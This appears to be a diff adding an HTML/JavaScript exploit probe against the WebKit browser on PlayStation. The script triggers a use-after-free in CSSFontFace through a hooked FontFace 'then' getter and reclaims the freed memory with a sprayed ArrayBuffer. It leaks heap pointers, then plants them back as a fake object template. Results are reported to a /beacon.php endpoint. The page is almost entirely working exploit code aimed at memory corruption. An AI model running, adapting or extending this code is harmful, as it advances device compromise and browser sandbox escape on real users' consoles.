@@ -1,0 +1,354 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1214 FontFace CSSFontFace reclaim leak retest</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:16px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:55vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1214 — CSSFONTFACE RECLAIM + HEAP POINTER LEAK (from p563/p564)</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="finds">waiting for results...</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function addFind(t){var c=FD.textContent;FD.textContent=(c==='waiting for results...'?'':c+'\n')+t;}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1214-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    new Image().src=u;
+  }catch(e){}
+}
+function Bsync(tag,data){
+  try{
+    var u='/beacon.php?tag=P1214-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+window.onerror=function(m,s,l){try{Bsync('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1214: CSSFontFace reclaim leak retest
+
+   Adapted from p563/p564 which CONFIRMED on 14.10:
+   - ArrayBuffer(192) reclaims freed CSSFontFace chunk
+   - Engine writes 2 heap pointers at +0x58 and +0x68
+   - Engine accepts template back (p564: RESOLVED + ALIVE)
+
+   USE_ISO_MALLOC is OFF on PlayStation (OptionsPlayStation.cmake),
+   so ArrayBuffer backing stores share the heap with CSSFontFace.
+
+   Mechanism:
+   1. JS FontFace 'f0' with local(Helvetica) + CSS @font-face 's0' with local(Arial)
+   2. FontFace.prototype.then getter fires during load() promise resolution
+   3. Getter removes style element -> frees CSSFontFace
+   4. Spray 192-byte ArrayBuffers inside getter -> reclaim freed chunk
+   5. Engine writes heap pointers into reclaimed buffer (80ms after getter)
+   6. Script reads the pointers from ArrayBuffer
+
+   Constraint: ONE successful run per WebProcess.
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+var styleEl=null;
+var firedHere=false;
+var stage=0;
+var leaked={p58:null,p68:null};
+var probeDone=false;
+
+function hex(v){return ('0'+v.toString(16)).slice(-2);}
+function hexq(arr){
+  if(!arr)return 'null';
+  var s='0x';for(var i=7;i>=0;i--)s+=hex(arr[i]);return s;
+}
+function grab(view,off){var a=[];for(var i=0;i<8;i++)a.push(view[off+i]);return a;}
+
+/* ─── Stage 0: font source validation ─── */
+setPhase('font-check');
+setStatus('CHECKING FONT SOURCES...');
+log('checking if local(Helvetica) and local(Arial) load...','info');
+
+var fontCheckDone=false;
+var fontResults={};
+
+function checkFont(name,src,cb){
+  try{
+    var f=new FontFace('check_'+name,src);
+    f.load().then(function(){
+      fontResults[name]='loaded';
+      log(name+': LOADED','ok');
+      cb();
+    }).catch(function(e){
+      fontResults[name]='error:'+e.message;
+      log(name+': '+e.message,'err');
+      cb();
+    });
+  }catch(e){
+    fontResults[name]='threw:'+e.message;
+    log(name+': THREW: '+e.message,'err');
+    cb();
+  }
+}
+
+var pending=3;
+function fontDone(){
+  pending--;
+  if(pending>0)return;
+  fontCheckDone=true;
+  B('FONTCHECK',JSON.stringify(fontResults));
+  log('font check: '+JSON.stringify(fontResults),'info');
+
+  if(fontResults.helvetica==='loaded'||fontResults.arial==='loaded'||fontResults.serif==='loaded'){
+    log('at least one font source works — proceeding to reclaim test','ok');
+    setTimeout(runStage1,200);
+  }else{
+    log('ALL font sources failed — cannot proceed','err');
+    addFind('DEAD: no usable font source');
+    B('DEAD','no-font-source');
+    probeDone=true;
+  }
+}
+checkFont('helvetica','local(Helvetica)',fontDone);
+checkFont('arial','local(Arial)',fontDone);
+checkFont('serif','local(serif)',fontDone);
+
+/* ─── Stage 1: CSSFontFace reclaim + pointer leak ─── */
+function runStage1(){
+  stage=0;
+  setPhase('stage1-reclaim');
+  setStatus('STAGE 1: RECLAIM + LEAK...');
+  log('=== STAGE 1: CSSFontFace reclaim + heap pointer leak ===','hit');
+
+  window.__alive=[];
+
+  var jsFont=fontResults.helvetica==='loaded'?'local(Helvetica)':
+             fontResults.serif==='loaded'?'local(serif)':'local(Arial)';
+  var cssFont=fontResults.arial==='loaded'?'local(Arial)':
+              fontResults.serif==='loaded'?'local(serif)':'local(Helvetica)';
+
+  log('JS face: '+jsFont+', CSS face: '+cssFont,'info');
+  B('FONTS','js='+jsFont+'|css='+cssFont);
+
+  var A=new FontFace('f0',jsFont,{unicodeRange:'U+0041'});
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive.push(A);
+
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: s0; src: "+cssFont+"; unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(firedHere)return undefined;
+      firedHere=true;
+      /* CRITICAL: NO sync XHR, NO string ops, NO beacons between
+         the free and the allocations (p563 doc requirement) */
+      if(styleEl)styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      styleEl=null;
+      document.body.offsetHeight;
+      /* spray immediately after free — no other operations */
+      window.__map=[];
+      for(var si=0;si<SIZES.length;si++){
+        var size=SIZES[si];
+        for(var k=0;k<K;k++){
+          var ab=new ArrayBuffer(size);
+          window.__map.push({size:size,view:new Uint8Array(ab)});
+        }
+      }
+      try{document.fonts.check('1em s0');}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  B('S1-LOAD','calling');
+  document.fonts.load('1em f0, s0','AB').then(
+    function(){B('S1-RESOLVED','ok');log('load() resolved','ok');},
+    function(){B('S1-REJECTED','err');log('load() rejected','err');}
+  );
+
+  setTimeout(scan1,60);
+  setTimeout(scan1,400);
+  setTimeout(scan1,1000);
+  setTimeout(function(){
+    if(!probeDone){
+      Bsync('S1-TIMEOUT','firedHere='+firedHere);
+      log('stage 1 timeout','err');
+      addFind('TIMEOUT: getter firedHere='+firedHere);
+      probeDone=true;
+    }
+  },3000);
+}
+
+function scan1(){
+  if(probeDone)return;
+  var m=window.__map;
+  if(!m||!m.length)return;
+
+  var bestIdx=-1,bestNz=0;
+  for(var i=0;i<m.length;i++){
+    var v=m[i].view,n=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+    if(n>bestNz){bestNz=n;bestIdx=i;}
+  }
+
+  if(bestIdx<0){
+    B('S1-CLEAN','buffers='+m.length);
+    return;
+  }
+  probeDone=true;
+
+  var v=m[bestIdx].view;
+  leaked.p58=grab(v,0x58);
+  leaked.p68=grab(v,0x68);
+
+  var dumpStr='';
+  for(var j=0;j<v.length;j++){
+    if(j%16===0)dumpStr+='\n  +'+hex(j>>4)+hex(j&0xf)+': ';
+    dumpStr+=hex(v[j])+' ';
+  }
+
+  var result='HIT|buf='+bestIdx+'|size='+m[bestIdx].size+'|nz='+bestNz+
+    '|p58='+hexq(leaked.p58)+'|p68='+hexq(leaked.p68);
+
+  log('!!! RECLAIM HIT !!!','hit');
+  log('buffer index: '+bestIdx+', size: '+m[bestIdx].size+', nonzero: '+bestNz,'hit');
+  log('+0x58 = '+hexq(leaked.p58),'hit');
+  log('+0x68 = '+hexq(leaked.p68),'hit');
+  log('hex dump:'+dumpStr,'info');
+
+  addFind('HEAP PTRS LEAKED: +0x58='+hexq(leaked.p58)+' +0x68='+hexq(leaked.p68));
+
+  Bsync('S1-HIT',result);
+  B('S1-DUMP',dumpStr.slice(0,800));
+
+  setStatus('STAGE 1 HIT! Pointers leaked!');
+
+  setTimeout(function(){runStage2();},500);
+}
+
+/* ─── Stage 2: template acceptance test ─── */
+function runStage2(){
+  if(!leaked.p58||!leaked.p68){
+    log('no leaked pointers, skipping stage 2','err');
+    return;
+  }
+
+  stage=1;
+  setPhase('stage2-template');
+  setStatus('STAGE 2: TEMPLATE ACCEPTANCE...');
+  log('=== STAGE 2: template with engine pointers ===','hit');
+  log('filling +0x58 with '+hexq(leaked.p58)+', +0x68 with '+hexq(leaked.p68),'info');
+
+  var jsFont2=fontResults.helvetica==='loaded'?'local(Helvetica)':
+              fontResults.serif==='loaded'?'local(serif)':'local(Arial)';
+  var cssFont2=fontResults.arial==='loaded'?'local(Arial)':
+               fontResults.serif==='loaded'?'local(serif)':'local(Helvetica)';
+
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: s1; src: "+cssFont2+"; unicode-range: U+0043; }";
+  document.head.appendChild(styleEl);
+  var B2=new FontFace('f1',jsFont2,{unicodeRange:'U+0041'});
+  document.fonts.add(B2);
+  void B2.loaded;
+  window.__alive.push(B2);
+
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(firedHere)return undefined;
+      firedHere=true;
+      /* CRITICAL: no sync XHR between free and spray */
+      if(styleEl)styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      styleEl=null;
+      document.body.offsetHeight;
+
+      window.__map2=[];
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(192);
+        var u=new Uint8Array(ab);
+        u.set(leaked.p58,0x58);
+        u.set(leaked.p68,0x68);
+        window.__map2.push({view:u});
+      }
+      try{document.fonts.check('1em s1');}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  B('S2-LOAD','calling');
+  document.fonts.load('1em f1, s1','AB').then(
+    function(){
+      B('S2-RESOLVED','accepted');
+      log('STAGE 2 RESOLVED — engine accepted template!','hit');
+      addFind('TEMPLATE ACCEPTED! Engine trusts our fake CSSFontFace');
+      setStatus('STAGE 2 RESOLVED! Template accepted!');
+    },
+    function(){
+      B('S2-REJECTED','rejected');
+      log('stage 2 rejected','err');
+    }
+  );
+
+  setTimeout(function(){
+    var alive=!!(document.body&&document.body.offsetHeight>=0);
+    B('S2-ALIVE','alive='+alive+'|fired='+firedHere);
+    log('stage 2 alive check: '+alive,'ok');
+    addFind('ALIVE after template: '+alive);
+  },800);
+
+  setTimeout(function(){
+    B('S2-FINAL','done');
+    setStatus('ALL DONE');
+    addFind('=== P1214 COMPLETE ===');
+  },2000);
+}
+
+/* ─── Also run a no-free control to confirm the hit is real ─── */
+/* (The control is implicit: scan1 returns early if zero nonzero bytes) */
+
+/* ─── Reload poller ─── */
+var _rl='',_rp=0;
+function checkReload(){
+  if(_rp>300)return;_rp++;
+  var x=new XMLHttpRequest();
+  x.open('GET','/reload.txt?_='+Date.now(),true);x.timeout=3000;
+  x.onload=function(){var t=(x.responseText||'').trim();
+  if(_rl&&t!==_rl){setTimeout(function(){location.reload();},500);return;}_rl=t;};
+  try{x.send();}catch(e){}setTimeout(checkReload,3000);
+}
+setTimeout(checkReload,2000);
+</script>
+</body></html>
